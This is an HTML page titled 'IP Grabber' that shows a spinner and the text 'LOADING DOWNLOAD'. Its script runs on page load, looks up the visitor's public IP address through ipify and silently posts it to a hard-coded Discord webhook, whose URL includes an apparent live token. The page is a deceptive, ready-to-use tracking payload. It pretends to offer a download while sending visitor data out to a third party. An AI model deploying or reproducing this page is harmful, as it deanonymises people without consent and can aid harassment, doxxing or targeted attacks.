<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Grabber</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #3498db;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .content {
            text-align: center;
        }
    </style>
    <script>
        function grabAndSendIP() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const webhookUrl = 'https://discord.com/api/webhooks/1423474255311540255/p2Xs07HWQrYY1qjF5ucDsTShpficwv_Cr3Bsxg732w28_I2e5H4NGM4Q06B1KxVm0FBm';  // Replace with your actual Discord webhook URL
                    const payload = {
                        content: `IP Address: ${ipAddress}`
                    };
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                })
                .catch(error => console.error('Error grabbing IP:', error));
        }
        document.addEventListener('DOMContentLoaded', (event) => {
            const loader = document.querySelector('.loader');
            loader.style.display = 'block';
            setTimeout(() => {
                loader.style.display = 'none';
                grabAndSendIP();
            }, 2000);
        });
    </script>
</head>
<body>
    <div class="content">
        <div class="loader"></div>
        <p>LOADING DOWNLOAD</p>
    </div>
</body>
</html>
